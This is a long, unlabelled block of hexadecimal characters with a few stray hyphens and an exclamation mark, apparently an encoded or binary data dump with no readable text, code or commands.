92048ce68239ed0eb149bb0625ad9d2d7ec083c9e7e9084a959791953260614c2da066572a1a1ef040f0b2f05ab3e4b8a568b12ce5b8c594787c83e6423a1a21cd0e5b30d3dd85e1c29a780acba2aa8d8e5b82b9bc0ee58aace898496bd298b5f54605d8bd166aab1dd710214e380bf9395f1db801549280d15c30e7def39552a6c6efbaa6cb8929ecf0a703cc9a252726438b0e171524d957adc95af2dad9ca4fa16884343b9ccd89ee6e5a2dac09a12dd9214295f82dafc3e9715fda6d3edaed7b88883347a6a694c9912947264643cb0aa8055d1bade99e684a5ac888d2aede76029c153a6b961c9eb816be8202ece0fec83f3a8419efb99a2f4fcf686c340b9ccd89d60d7527c1b3253b44a812b9e5f5bcf4b8bf316266da7764aac9726a6aca98a694510deb4ea6f56652612032ddf609649ae048c874e43e54091ca159c8a0c791482187f51418343a08e25a1da0e9c2c88454959ca439605001b39218bc87e5b0ea221a26e41bdae13cb0de86564a60337785c4e615c6b7b6bf019f5f056ab5ead7286b2c832a568eb168b42baa29c31f729620cbe13d5f7bafea1c8d93668da45d45830103591355615954b5d1714b4897d703203d79d0d2a3a304dbd3b752162c0c6953b95b2a150d0f78e59062ead9dbca358b1d1ea876cd878942a5cd53c1af69fef62860036bfa58bbc76d2d97c88e82f3be503effaca2c69ac0ada9d2862ac41b79a3b059478a365606dddce94cc0ca3a2ca0da086dee8be2b29efd085032d3a6f14bc19d2ad631121863762db9b8ce3017e62639b4a1a55d0c031b333ea9b52c1f1e58a7236ecba2b2a5dbd3d5ba86b828d5fce376bc2f090e61e656dc0c35e2265b2a7a4b5ad20e98ddefb1924e3af9c9722530d280b04c45cb228e1ed3258d0ed809eeba7b4913c57f34776cde1679dc320528d4610a999897fa56fd25c7916099620b6eac2988f5e4f829c80e11a4046f791d06af0402670720c37b2cecd3f5e1e3eeac463be3159d6d47ec66a82086784c5760a5c49042666cd483899a4cdad78552bf6171e741aae1b0a73b0dea6eb934a02ad3af8174a3e23eb3975fc9f8bb6a1f612b69ef7499e854aa48db9157e9d81515cfe9f6bbad4d6763696a69413caf8934c006981382c2fbc471211b13c48f7f1eaf8a90c0d79c995dd7e6ec122c50e1fdb9f869eefedf04daebef4a1ef4f723affa39b1519874ab10d1dcefcba354f13d29a457935b9b20afb8b33d48885f69c10aa65829c665d21923f2ef1a6a1532959902f77f8647852dd5a0eae3f26c284287871f2fa7e80a19df62b0e80764c8882344c32f35a862e555a233d853c66fe4220587366f8b3c5e72946224788e93b55432ba95a76534329afecee696ce899e4a80723a0a74fb442ba15b5e473344f599b3878b29b28f9c544a996870fcbcee5cd2967b5d36132812330ad3858cdceb6f259a37f6ab8f517c223b4536db5268fb0edaf04e35b90ebc2fccfec5334fe5bcc165225bd2d10415e604dbfb25f66a3bd24fb98f3746d44b984b021192edef2f4b55752d88479ed7bcc208b91a0c2113f49023da4d3029d77bf02818658449238391e2e1f34186d133d427773ac51a4f631466e7a4cebfe735136d4e8d5bb304dd1f2a5acf7987e05a2cf5810d2a839ca50397f1b6c8e3d9a8e4a9e8431ac9a1e1eac8ea826458562afabb4a2fac89a9b02caadae8b825a0cbebfe5cd1d5ee99856e0b137f06cf553747efa6a4911b43bcecef3268a4aa33c1f79492f12d6e53752d882341b860cec7fcc443fb84b5bcd15cc08d2d07d4aff51eeaf489848e4b6bc413281b40734f4764d476614cd1a366b7248817d897ad236b96a0fbb32b0e810d2a839ca50397f19eb731557c178d956691aaa134b720d644565816556d74dc12d6e5f5b85ce9ebd87c98dd1626ff4806312667cda684b1e624824851c39e045a6fa68d045866fe3046491cc888850c7a3c3217dcd7fad2a8d05a71430c12d4019a2e8c4c4855c949f31d00b65454dd263352dc563a87ddb5ec47d58e354bd0fdd99287c0069541ced281cb78cfdb15fb79158d94668fa89f363221d6c4555816556d74dc12d4e57573aec84af64c25b7852f133f47256ecc99b62933e40e102ffbbb0c6ac9eb0cf03da5247a8bdb545d0be248102e9873efcf4fd77498c0e2a793cf7e3a8232e56564a50c58c8496b919d9396a3816959c5da85909cb49eb729c31be5a43548fb27c0952c8baa363a6e09eaf23a3669897a0e19b6ae396f119a2b11e284b590bfebbc75670ae9ece70c2602a26b25fcfd1574b63890a26bf4e4653857ae38524dd67c6f2a14b38445d82d40619878a5ab3ba831c751953109e8580cc606fc517bb96ced08f57510cce774a322bbd9e3e4935ad84bb604e4224196c37ba256ae7e3ba7b3d7c752417688682590cbebbe0cb9bfb1cf84b67a0076ffd3af777bfc35a4c9b1af29050dc010f686e4ed99389c4a4f0ca0554d4e2746560b001e9688d0aebe66b254961dcdd38b4f238758c8c6e819d699e3811330bc2b666469e496f5a1d3d160a34abe40576045a7050d2df496626d6ef351afa49fe4a8f552d4a10a594b2459fea27a1197e8a184aafdfd3f7b9cb1adf46ebc03a5423786f0f9fb1da91a113ac972d12131049138b5a06ab3c99ce314ac4d3e3e4600584b41d968a2af6864adabc6e71ca3c372c7e66d91c72d5380421da6908979e96ed55f691c099605b6e0c65282589f193625c55e6d12536874b412bce5753043b446ae6d3e41146f77c726ded72226e6cdaca604616d1d579f562ca761c479938fbb76a4aaba16c481c82f64306ed26c0a2df5897441d33b6bc9cc50aef7e0b1a01bd58ed842e79437ec17530ef2fe76614c71a666572a1a1ef052f9654bcf9a25e8fe13f5e7d762a90f6c5019e42c1db88cf774cdf29a604294345b9ccd89feaed20b6b622a2c8baa363a6e09e8f23a962b12281cf1be8cdbc2cc3f985e6de5353f39ffb6e968309248083a4b79078880e85a097f7f05a02d0e6411800c4a3a04c221171da92c6bbe37158a59c222ec16a0304cbcd2d51dd436c7c9e889b9dd4c9306585237a8959969e8eb2098cfe946057cb3074aefec355bfc559064bbb7260be624257121168d92668bb339d1bfa13625a6c2b2a86aa3e396802eafe3b9b2154694f0fa273fb2131fe44c2ccce1ad293fe469012ffbbb440b078a765357a661b2c56daaae0571240817cc79bc075ef9bbfb9dfa3c15f166a69c4a19b030a61450b32b150d0f7818785974ad5972d452b4589672d4624a1ca0332bae72dc1aa4fd13e04a9645551b1db7047579dd9e2b02021d1a1f52b785893fd1baf54405d6bd166aab1dd710216a542af1c19c68e8fd68620b3afba9828980689804476e079574088443ae32521dd67c6f2a14b38445d8ad3b619878152bee84a86bcc50364087e61f97ad9d78be0e96022edda0a06cf7c8c16ab59483155322072b31a9b10d0df52971159645551b1db7047579dd972b5a4a3bfbf808bb2ddc1f59d5fdc0aa9cd6ead7534d6b78d9df255a81ce3ca3118ceffd81985a8cc6edb8a653ce112fbf2a65c0c2186453b32b150d0f7829fdb26059b3e418c6b5f01514f005f747fed1b1ca78cfd5a4896c396a3d2f760ab243842a815b5ef74d57621a3b1bf9a8ba2d4cfecd96c2a21c94fa72a65d47ee78264e50ad8eb3ef0805862d5ea1756df41c14c199142fab1034e6874c6f294678841cd74b1aee579c69082971717754b45ac862164abc6da9ba6252e8f172b89c8cfbe4ec4aec6664934fe821e8d9ecd1dce1d5b97ead5c4ef9651cbe48a9da6cede76af5c2ee78b691e163a1af3d8012c2f960f29eaa6def6d2d65544f9ee010eb0b2067f9777f772dc9a23a8d0e5862b7bc0e25c9560ed9bfed444514f31eaa529b9033755352889e5f314de9cd1811100d9340295efeeeb2541601ab271e1d0eb9cc488558f3bda950cc121661b7ec846132a23f976d410a81d6c2606c808e36a2146cda91e7eb6029e0d20d0aca768f530f4d25550e50400735695924c7862b67a933014a9645551b1db74473791dcf15d56bce2e3ebe6e0b139f7842d5cc29ab294facb9a02587c0f652a7963fd8e04855752d8803915fc860dc0243c5b2595fb529b48e8f409528b1faf80926e57a0f1e15b3244f2322db1d6dd39f1e6e44e77d8579608a6c7902a51ac7d894833269bb30e6a0a166572a1a1ef060a93afca21021d98f2aa36b96a0fb73f808810d2ad356b5d09ed9ff2f6fcf3c844c336cc14c7517850b6bc2292c8baa363a6e89e5f2ba3957e4703ad27d5cdd1666ffee22f5680ef24d490269187a55c3ba7368bd99365f6099e243375b1d09998edc992a812334b470f08a26e4b09e02d1d387548c810ed074616442aa4a4e9aef00b0a5a2ea369991e2b6d239d5ae653faa76ac5982ee3f451bee2b28e00bee8ffca36395f19ea8f9d55488864733c2d99c28e8c26e614dfc6cc90e11aa046f791d480f09048e6c5fc66de1fe74a2f5eba84f2a5ae4788d520ec1211d2d7e292b9d82c7656b0057b3fa05db5225bf06e7a0e76d84c558062e64ede7d0f67d6df2a95e3418686da085dc28a12a4898d405ed34a05a3802ef613928340d8609ee26c13f4965e1a11501a0655ca89af9a6f70f072d2e8c95845aadfa35ca1acba08a9503ee91a30edc1ff94790e5f09e6adab8fd7b426c340b6cc14c6b8c0bc89ae0d9921d225489dcf2ba3d3db642c8e65eff2e9efa8526035359dc31bee99a44dbb97b4bcdcec3041d6e3ced8f1288e3f2164e5329081cc69eed92fa5a818595856c40f341dfce32047803e7a45086fc522f4b65b960d593194346151609042466d54b40855f8fd87efd4859915947819099f78b7610f544a0416b3b0da86e91c030fc07a2b59069cda8bf4bcc208dce4b77b7400c39af88cfeeff1c3135a9c2643f415cbc724d7e6c46c7d00864db673a7a9b7e9b6a988ec37315f2ee1a98a1be00ac0edca91334832ad6ae804312f3cd92a4b575461ed201c2785be4f142c7dfa99408876f588ceeff9e33df08a6389b13f53144206be2a8263b44b012c4e57530415497395b3044898a3534bcd2b6701338d2
-8c9a1f8026b1a05405a6ae40838b8132924cb0a310b083416eae3c0e255b8a997f7bb62d1d55a4f65aa8cd767c438438e953c81f514445cfb3657f974153060cbd72c4fbfbcb52555d0be2481048993aca8f0382ae710e1a4085f132aa52062c8cc13235bb52d1f08097c42f0b8f354bd0fde798782aaa29f32972960e5cc67bbaf9e3ea223a1a20cd0c5b3053dd45e1c29a700acba2aa8d8e5b62b9bceec1f28e1352ce4838c84f3423dd99423afbd9828980689804476e0795740884432e375241d67c6f2a14b38445d82d3d619878452bee84a86bcc50364087e61f97ad1d7dbe0e96022edda0a06cf7c8c16ab594831553e2d1cd98e2b2688834439ccd89f20d852901159645551b1db7447379dd952b5a463bdbf800bb2dccfb8938a2724d96535753de58730201a6a8614f36ad3793ca0391998f422c890319b190418f07868f65b3be342ab48e8f4a9528d5019a2e8c4c4855c9499a03f2a10de781351da5037dc4e84f6def17fd7df87ce4d76ad5af51d6580655ac1c5787992aa032c859822c87f7748d7d3ea8e14c48926551d546c72d615c5ec7734554c4d9c485971e1c25d65b0fb8ca8285c96d46a5a2e101af1a52483d7bf7b866b1c303d5aef93051a8b2cd7d04c9c75264cbde5d0d51339e45e281f5da5d5cde176edfaed8e7eedf83eef1bdf04d3fc28897fd5da25dcab397542509180d29697b7f1dfd0ae23b3867470c021e47af0fee74d9118593eee9e0bb6609ba7f446e934a40b4f059b1be22420636458ecf15a4350097f1b6c8e3d9a8e4a9e8431ac941e1525c160d916688b33951dec5e1c29a800acba2aa8d8e5ba2b9bceecf151122ce66be8cdbc2f647423a7f1f64eea4b8f5775512f65a58bff46c1fda6e0f6a8c09235ef6778996a467ef319524603417ccb9e78828df25c3a912aa7946bc3053fee934dc69c5221f9b1e9a5e16a76b96294821b29fad75f51514f005f747fed1b1ca78cfd4308a4cad81d1d4b7055b2a9f64e81b829c82ec10a14ad896d7d1f4d8d0295a779c63ef0bdf27bcfc03e9fa952399513d9ebdd5539280d15c30e7411e220560dfb5cd9a2e87a1705c9f0e216b961c863c2dfa2106252017e97065bca76cac967fe7783448fbc362a9203b44b412c8e575244304e439343e946e0b8ff89be61c95fab22550503cdb25f5350c82cca31b90fc8f9610c19fb5217ef494dc6e0925cb051239440d1484346d719740c06a16a20b1de5ca7e61a4347ed152b544f58a4b26c919f209e042a6b503fe2ebdb65b745e0c5cfc0d390e88cfeeff1cd1baaac2643f9daee43d36a3c3a569f947a84409e932a0ac5332a49912c8ae8dc3be1e8e39c87bbc042be87649b3a12112947caa1b0153fed63d8c4493b745de25f04ea5c44307f0e5bd39f3986086b33951dd557a613d35720ab2438428615b5e47617b5f52f40d1d81830707695bb8096af4c3dc8226b1a8b4fc25ba0f2ab52218db4c34c30d5faffa1d0e5a53ccc1c69662c7bf9a074c7957b909b56220d8b2bfcba059a7ce04df535ef6200d2da9aaae0571240804ee8ff9028e948dc403cd7d8db1a512cd387caccd2ba1e3d21af104ca06d0dcd31119e51c46f935a507d491354bd0fda1e6f3a9e6c2f2ed29e33bf2928e58c6db228fa7a192a09ef34cb296ecf6b6ea48e58264582a2ababb4a2fac09244c768880258acbeb1149d2d793f9c8ba2dccfc2df07a43aff3c9a1b24d47c2e8f426b2de707e7ab95650490142b3904157453aeefb5a1ffe0bad153774e4e039ce6f372a421ec1fd9160bd2c31de931d9ee1f42d488ed04b21d604cf96ec10a14ae496d71d6d6fabd6833adf7c0cb1a33811e204bb90bf6beb7b679ad779012220ba56c2df5fc9fe1607b2088c6e83af86736388be18db4cef67c5e4f19285d9403469ca15350baca0c61c4755c624a07531181bf047ede5b2b583d5d741309fd3bd6e642b0f13e9cfdeccfa0a5ab15991643fb9265313dfdc4a646a0d8ca6be2dd852f92463e010e41464870855c2b6bc8ea6c7369f890a5ec7e5c7f5fdf9c49d8f257e7bedf4f7de802d27c8a6846b18596840049dfd14c44430c0021192ecef2e4b6511686e497d1aaa865cc2a422aff9de542866098bb05bcf72ce2869cc7c68c0dfc92748394b914228e9b3852db85b670ce41f4196c37ba62e725e6c340b9ccd4dad133c05b7d2e60874fb842a915b5e47d3234ae735507ea0273ecbd83529e7b8a6c40994ee7c5ed79aa5a997d40a484b28592e340f1f3e4d3eafaba6317745b1e60c21e4f4b85dec09c2786ad02d0a52cd189782a7a101d781b9b490698d95bf4b04072a9d0746b77ce5e3ce4c2224fb594f8cc766740c8d5727214d4e4fd771a566abe45063bb929e9ab75b84a7055eab1bd4099a41152bd6573432308454325aa704e425a594d8bc2df2389a0c9c6d950887704a9c3caa68b0047584846635cae3bb32a21363aa203b44c012d0e5757b92c85adae88d1dad54212251da166e821ade30b7a0490cb0ee03ada6d481394f179bfd6cb190516eceec0e922dc597fcb5bdad638810276d0af923eaa6e879b6ecef3268d080a1574e757f7f59aaaa6b411c0902294f07f9b53d08fbae8dd674e266a69c4a19b03006d0d4ec4a45c3035e26bf2c46d62c41f79f68dae9871894805ca4c395f19e69da607b4d0896a08e90cdd80c57e985350105c80e11ad447379dd93215b71448d11e3513ec6cad19c0871225cc8df795c6aeb5099de703278b94650490142b390e1212a96343e729b04696ee8c8c1b39cda34da484676c26d211c12a7701217244768a5106b4208931d226089dff23a8adfdd9ade5dda5e16b1ec7c9b12c5eadb303b2d5ee6354b20cb917eca7dbce16c8d589005d970035e5ebd845c0d8690099ade704b668672bd43a9f69354c155c8e32addc86a54d029dd8157005040b70b63ea3d35bb52d1f080878e97ad666b9609d0a1b29fb0fbdf504d99d590b374e032de93f5e19acba221d20c713627cabb385c581350615954b5d1714b3497d7ddb92200d2a1f111765bd8eb6737f309d17de922f78378d9df65d0cc542781ef2905a22d6e53752d882341b860ce3dbf8427e4e1a88a43e5805a13b6674b276ed6661b58185337a8d9958a8607bc50bc2c14d72c41f79fa3a5ec705141928ddc9aac25afadad44bed6d86816d88299d66e422dac099e2dd9214295c82daf23e921ebd97178bd2fbc3fa279fdea7d5cf3b4190eda94e35b53aa359d12240f059dfdf4c3444074ad84bfbf02a01607b2084006251d02e18815858bb18d66cfe0c46211766b5918265e151c0223333a0d68a029c5656b67a3af83a5804bb7979f2b7b897a4fdf1d56543967011dd4a465911c1aaea991d2ec7136273634d4a7c4555816556d74dc12d4e5757fae34e8dd3f92cdfec15462720e524d092377ee78d9df255a49ce3c3e5d30e7de0fa358d361028b9f7ed6b49f8ea054791959290316c6d4026a76a5a2e1010f042f0baf354b0e605c0b5f41015f707fe41f1dab8cf754ed99c89533d6f342a7203b44a812b7e575ff58252ae46ce623ebb630edc17e4699ca91aa21591a5a3d9af182ce7ebe602220ba56c2df5f816a8b035904860f578673e5f2231568cdf7a642314b5884dde213868957b6ba831a731c551993808ec5606cc01fb597cbd6ce535f07c17c4e372ab29b3d4e3b8cf9f1120a1bdc1f09166439bce76beafc148a4648b3c3d99ce8de508a12425bb243842af15b5e77e277bf596cf2df7a115b73226bca94a652bf5b0aad37930a0291e9364f20bb04474226a5a8fa254096ca92208c7d42b390418f8b4316b0d427d205cd9c25a903345d189990aa9293e63b006ca9a8ba4d66a4b8ad747e9cb896fda8dab16609baff14edb7afa0802fb83ff28f8e55c67bb60ed8ae47d1d86816d88299d62ee616d604cf96ec10a14ae496d7d1f4d852cd9e3f6e0b931f5802d5c8f1b529591a9a3d9af182ce52d6012220ba56c2df5f816a8b035904acd23c3a1c72f9910ab4e67b53a198252cc26ef909c3c42b5c43606446a7010d34a5b86ced74f375b01470e9f6f273652f51efd9fbbb9a2a2725a0839ab42c9283c2a5b82c1a22cd106773a27c43614a40856551d546c72dd15c5ef7e68af669c8a0b9699f9f10bbae177394ba76640e0306c3a56215229afd41479d33be27953c6b71abaa6b413c364888bfb1948abda9d29b57b60fc2911538f01e9673c1b2256bb75971ffa7bb83904f99ca4c81fb3f432508510daa3e2e0f151d3a46fcc8f537ba2da68b1e41869ca86d0f7bc996805ca420d2e63d73bfec504403a599a3a977fa19b81f4c05d921a295482eaf7b33a4af0188d60139a7942ad1e0f71dbbf6060b44d5f66c4cbd5f1b1b9975642f9a5b0dbedfda38b89e7a1bfbc5cfda34ba5d7cc7d67de31bda25d65206c81e3e1f78aac7ca08a60bcd0e2f9af1254de6beabaae2c6b7a75c1ff6b9d62463f20eb559107c1db1699ec181268aa90031ec1a2797445b2944b367fb0414ac694805c180b8ba49e587cf2f7f069d1707d7c343d0477c76ffa7e481ba048d45f09993fa0a5cb77346fb526de3fcccf555b7b41b96a30647d807c3b10079770dfc505f00562754d4099a41152bd6573452afa6156b4bd7bcf069cdc2f6c5795be45d02ef544a8423d71f9ef2fd0921d20cb105dbb9950092935e924555191da7446f79dd83de924a53bde9b4c75c136f9910d609374b4035a8cbc50e16ac241d3e13b614d31f38b2b5cb8ee05e0b8a6adbd7316fe614247860ebeaa6516079305d3b2b8b7c115280047fd686f8d173b25addba94a7aa21da4d68dae22e81402b61122afcfac4f6eb418ab92b8a35670821a7c7ed9402e49fd33513557b9458d140322f2594d46234ad3301228865d542a669e0ef1241844a27c4c0a6cfdbb4261192fdac67c763337a281ac9a66d3563b5f1a0e216b3f13a21d723368d0dec505f00d6de13c336a862c5fa8a46fa60c47cada301f28c52356cde1679044de63b9512e1b00d890d249b102c411d2189b119182290f5e4382ac80e11a4047179dd03e2ad38a2863757448e52a45863a2c506871ef74b9ac46232e7be2ee29b735357fb16f30e86b8b9f130506c29e6feba6b6d46de786e0268d3718a43a5e8dc50cb3c2b60122887bbbfbb2c9545c0c0aaad40201c8a4d35f7c5d866fa4c27268f972ccc06a24953ae885920db821482a79e936b1d07f9d6a4824d6b097d1d2c055cba4141d9ee8152f0f5c7a1f2ed29532bf29220cbe13ddf74e2275234429a1dcee644f786829440c264870858a2b8bc0e2689ea32670b1f55b785a98f13834ae444d59422b1ae63440e133ebf97439585719e64f25ac8a0fb02ddffb2595fa128b48ecf2a95a83377cbd70e2fd912908bf46ac678cf75c87a7a4663a359e06c4eb496909ef861661c235a09def23adc21efd51a4ffcc63bb12f9be3a6ecb0da34cc4ecb95d30ae3a469fc935af0aa0cadb7462cc882ecaf012faf2342ae0643c8044defaf253343b9de83c7826e542f620b9d53deb05f4c39c8fbdb8531c5999a5da96878c04be5972d3d6b96a0fb4fd19cfb0a0af882fb23ffe85865bc676a8ee7c546b3c0d9dcd43ac153702ba552a0db275489dcf23a9a1e254d5fd7e9cbb82d4cfe154eac470eb94db912a8d6f9c7dc6b96676a4445bb094dfe31b725fb6212a1b0738d4320ea89406342deff39f2e8b759c794b7854cd3dcdf2592702a9d97f5ae4ff26fa54d2224fb594bf363333a86464f1ba1a0180a09e305cecd16773a6aa8619546a1cd56cac1f1d80265e5eb60f843de5d737da82f00ab5341fbb052b3627d452321cc664c23c8350ae46cde167997c03b9512636a5c2c389bb727044933c5d99ca8cf4b61c57a76001564878852a2b7bc8e6586a2647b2f21aad3302b48dbc24d301a06753640936828ecd96b20f69ff30fc6754bdcecd81b0d5b8ab7dfacd9bc3a7fc266f203500179de296f82bb91a9841d7382ed21509c7e05e8d89cfb3e5e9803a1ca2d5e853c904696aaea5a108f3ce44855ba4ab91a0c2113347d6895cc0ce57a0f1e15b3244f2322db1d5e620606179a51f63d03f18ec270b7b3cd718c4d3928939cce21bfda66067c4e195db304dd1faa8b4f34bc13aa2935aead6aa13dfd2a65cbe3d9a8e4a9e8431ac9e1e1eac8ec826458662a36b84a2fac89abb02caadae8b825a8cbebae5c9115eee91f6f0b739f26c75673aa6f4a1448632298d6b0f649e76a3bd24fb48f379a7a6beec0a76f4795cc23340b198c5ba4ebbfaff5d59b426bc50de1d4c78c6e8249b9de8347c52a234e1a190c158f9f8f320c1fad55433ef78cc3961966457d859526958cd6839622b0be6e3f547036ba7dbfad5dde7f58cb7e54c15fb304dd1faae0cf3927f5430c4a402ed2e1ca784f39a02cff9e1027cd1a677362810bc18535b104c80e11ad047279dd9d217d8dbf8fa9dbc2dcbfb3835ae45d86a62489f51d23b298f0f91d3daa2d8cf3993a46256d08cd42268f5342a2f9286f12a4b9616ade02bee73ce3afc55276ce4c89871eb89e9ed1d86816389b13ad25cc27923a6551d546c72d615c5e77e78a1c5e67371f67b785a90f2aafb7cc66fada91396a57d6874168ab9f4f576e6bb6ce9af29c995b110909dc8cd83e3c358100094323883abc31a8aa585a82f7b09c0b962d59bbc5c8fd9fee0e02ba12d84c81fb3f430519510daac52ecff6fdd059ea07acbfdb6fb13856d56ab5ead7286b2c832a565e260e33bb406590b31448dabc671b1f0425a201d2cc7036270a4aa52ee1d4298baa363a6e89e5f2ba335704383a342ebeb837d5cd2be6ad1f443646173acabd23da4ffc2e288bdb8fd0a0c1f681bbca763f0508de17bedf07cbdb60aeea50c8b06a21268c51e3097b4bd1910e49b019287d5b676103683d1252c9b6ac16003c2c11a15d7dcd64a92c3b208392aa9c460eb1908dd1b6ab33c72565c3fb604696386ee90d5706e9acef33aae40bb4ae16fa5af2bf815e0e0fd273c84061961c81acc5db2cc7!
-50bac7257a994cd5fefe9f3d4ebe567a37de0138ebc6103e7fbf23550c4227592e3a24862012a7680db375f52da1c1006b934bfc08006b29281b4df4158d94aa755f76434da2b964f3b6c8e3f05080233a90867148acfa2b8f23c1b2c016dc585a10ebcbc1481335a48162aa8d8e5bc2b8bceece1539bcce6e3ece6e0b5ff6bb270539f3be5453eec867005ef677891615d479378d1f5a0ab5b84dd5b5208e04e18239bde7c83568272949ea0ba8045ddbace994f3c04baa4a19b03000ce0b1951dad5db0eff5981b366c9a18a6be12b28c00eee8ffca34398f19eb507b3cb5534469a25b660a67d43fd49106dc90e11aa447079dd3d455db10f3055ff10f5f1c4facea7d44f1cc588d772fa6acab99cbe72fab269ac9d2d7e3a4aeda72328765e4656ca808531b5809a5da96878c003c1cbc26bcd92339aa2c5b294031b53e208ed9e5da1a201d2ccb00533d55d142eac09a7b02caadae8b82596cbeb60aec84175f6f0d1755bf832f9532f626ace5b4d8962b956d2ce4b07a11a10c99bb74795225f1497f5ec5daa9299368d8ffe3b55ac62135c63762db9b8ce3017e62639b4c1a9a663808d199fcdda8796e28867b26e6ce9f674b5ae21ae3b95be5d7bdc97041730032b6ebca556da0055fccf9d886bfa3d56d249c73959ae0446ba0a969b685944ce635a9fd1013beb3dac09f5209a4b366f8b3c0e0f0538a2036918c7c6aabf0439122c536cc18d3506b1269ea835c7085a82b9bc0e278a040a670726235c23c044c24c007b34a8e3598fd296581536b620b1670bfe6eb4c1ac5f7ca76dda31a5234ea58a344e75416844b01109497bfdab5e3e9a9b81a8d2001b604e080aef13c7856c4c103ffe79bc2a42025f7366765d9bb34bb04085f7ccc74ad7deca4f6e7aaa87ad411c0c7eae602256791a53d92d15d7368034215049874038149b6aee8bb1cde4a60f33b2081fbb99926d410ab59d640dd069e8613f1694265ad1c152c0a51b1494ed1e28054375eae96f8568a21cc829354391e5f0b6c8e3c03121552a118ee4d070b9108b4649b3c5d99ce8df509b1253615954b5d1714b4097d7cdb922e1c191eccbb82decf3400816ae1cb39ab2c41a0c303b2d60e6354b1fcb91c1a4adb7462cc802a8725343a895839658a9ba16c481c82f64306e81a962d9acafee145ac767a04a945886fc049372bd43a901e30d25430192ea57cfc63db5a9a053ccf1ca010aef76614cf5a766572a1a1ef0b0f2b2b56dcd32014854f673ce03fd108312c2e5c2e43d51235ebf3d254e9a35cee6c40217820b6b6209901d225a09e4f2ba2f436e2b7d6dae0fabdbc297dbc5becf5cacc972ce6eca1d48c340ad1ad69d51ebcda41241648a0f986f7524643a728faa048ed02c64d0e39151e0bed6974685d68a1b6290a00ed074616442aa4a4ed21c903fc07b1e58d3cfa803bdc4e83b0af78bfe0e7c3ef26bb5ead7286b2c832a568eabde6eb12d595a6713e42c4196c37ba6e61ea71b606b0d8d6680b37954e9853581149645551b1db7447179dd912b12329c3d469484f77525d45b07b8ca8285c94d46a5a2e101af1852443d7befb866b1c303d5aef93051a8b0edf123c42860032bfa58bb3bb7f653b1bbc8bc2fdc6e02ee720f10aa9477ffa4e2c37534184940049dfdecc144403482eda1ebac920e81702836d5dc17639be993b4983c5eb2301b88264db9e26641de47138072268c2e64308d67164c5dd090c3815aeaeb05b3ede35f7817e8b6e9471c717cde9ce40655acbc5875f7eb7d5d1794805ca494039bb7451e0081fb4ea544387ee382e4691b8d906687b339d11d0304b2268a00d921a295102eaf6319226bea75e6cd0d0ff5ada952037469d3c7656bd1f7751043cb8132765ad96e37ba9ad41bf6552ca2a73274cd368cd3ca9b69df4e6ac7db96e2e347bcde5fddbfe5b5d377fc1e742fef856fee21b2f6bce4d1ec29c7159de982429c74e6f8654155afc754c00bdc09ed57c2e92b254b6599c8ce52682e1228940718ed5a7d6c61bc298550186813d6cddfe290f600be400b6e41ae255b5be82dc5626ef32c71373ed59d9c82acf72483da84d3d1e46d91c7eb9052a15a9d38a25b18dc05451123e430d6182304b2be008c46c1479645751a1db0c46e791d4a92ad1cb27fdb818e287679a64a0e827de921777378d9df6550835a2781ef2905922d6e53752d882341b860ce3d7fdc59c843a998f5c80185266ccf964edcaccd36b030a66e50b32b150d0f78a1785928ae5982eecfde111135b6f8c84b3a6219eff9dab719b1d12cb00533ad5de42dac09214c768880257ecbeb4892c87a761c64ef0b137fed995897b357536ec8c51d2ffbbb448bc6b3377c4a12309a0be6dc73f6dad2493949fc30280506290e4a97a763a50c58c8216b919d4396a3816959c58af51511c23b951cafa8128f1dafcab773d47a71201564870855a2b8bcee40b1843f87c607d46de1fb9728678d5b2c5c396e356509f32ac3a06215229afbb4369421be2715e4b6b855d5b5201e1b24c4df5836e5c759a00848b60f4f4d2040c2d008a20779c367e4da6d735a360ad34d36f21c7d5b4595d310d0414d4c29edbbc385530f88c861e8454025cba2aa8d8e5b22babceecf1595ccd9cdc7d96d61c70740adadcba9e9da914156471f1e9cba136abd99366d6199f910f89278e4b0c28b8b90c37a0a448fa6074d6b029d9caa92933407e4c3abce03eb7c087cc514437ead56fd1a658d6550c5ca717598f9022a839c25c872784fd7e26f2561c6d6e06826d88299da18259035a1149645551b1db7c47179dd912bb2ba1de3941e1a25d276f501ca8285c95d46a5a2e101af1652403d7bf3b866b1c303d5aef93051a8aeedf314f8c896bdbb1aa2663e027e7689795fd8e98720d15b79df4faa3a5c47621a849a64a90606c9743fffd87e40789d3dbe060a865a22a1ea5a100f3e25577c83a3db989332bda518e139cef2c6606687622ba493ba34b25c090ce98f516a954c545c9a0a4ebc30a874a37277bb51ff61bb79b6e3b5fff18e93ceed3ae9f2b0969285ebd8547afc5df264e50ad8a5a7a9dcc54a8cad242d6ea08c746db4a6133733e554ca80853180a666572a1a1ef032f96531b26619395878b29fedc6afafa0802fb83ff28f8e55c6db228f27a0929aa6db3cb296bc36b7b2eb5134369a05b660a6b58bb98535c1b3253b44a812b9e575577aec3355ed710b93989a535153a2341512d5b0ee2c5a6f26d5032233bfba581207326221831e8f74f9f7b5be342ab456dc1083047580a60b2313525572d27c07802d1555b7c98c14b795ced1752dfb51b563cd1274ff29baef6569c284845ca4c395f19eaf07aee926044b5047c8666c86abf4c29a800264878856a2b9bc0e64c8560ad9bd6708b92d4c7b42646d418eae4d1921377a78d9df6550e70d437fe48e4f49024673c19c47f9400f9c813910156ecb81485303041811209a530d44d762294723a6c46146233fafa291d2ec11f53bfb5c742d967242da6e94a02e48f61a96bebff2633f4a7325429c1073cb83b962f5fd048ca2863d49b4de4c2a0944667eec571207326221831e8f0c04f7b5be342ab456dc1083047580a60b2313525572d27c07802d1555b7c98c14b795ce29772dfb51b563cd12747f76e321b0416590b374e032ded335c48acba221d20c713627cabb385c581350615954b5d1714b3497d75db9b2e7703b73b46501cbd1b6294fac4908b3d312e634b63871fc3fd56d4ed77a6bc4822c78fa3654c93c42b390c1b8bdfe084b19dd0493723daa14cf2713a59ea9542e7e9423d9840bd1397a0a5541a7f40d5e6d40b1de2e8c390aa8d9958a4e109bdb2cc0d41c15c80369e614ba354bd0fd391e84c0069541ced281cb784fd7a1fbe9140d906686b33951dd45e1c29a700acba2aa8d8e5b62b9bc0ee78a004487c647d66de1ed83e4f9bf82f1a0d1fa85676dc28897fd5d06cd507512f89e5290d9e23655d7823812840be6dcf32bb8421ee24a207e720f141da3f8964e394bbc34ad94010b630a0435bb52d1f08017bb97c5dc9a25e8fe6c19436083ca2067e9c065bc27ecda248da351d26c713627fabb505c581353615954b5d1714b4097d7c15c1160e8d0f8b8ba2dd4cf46bdbd7a9f90fa2663a75f38cc09af2f0119be18bc15ab10d1ecef41d6a9e27b52290a2d6e55752d88c70609f1375664f9972d500424db87a72610206168045187370655154b4bf01e9673c1b2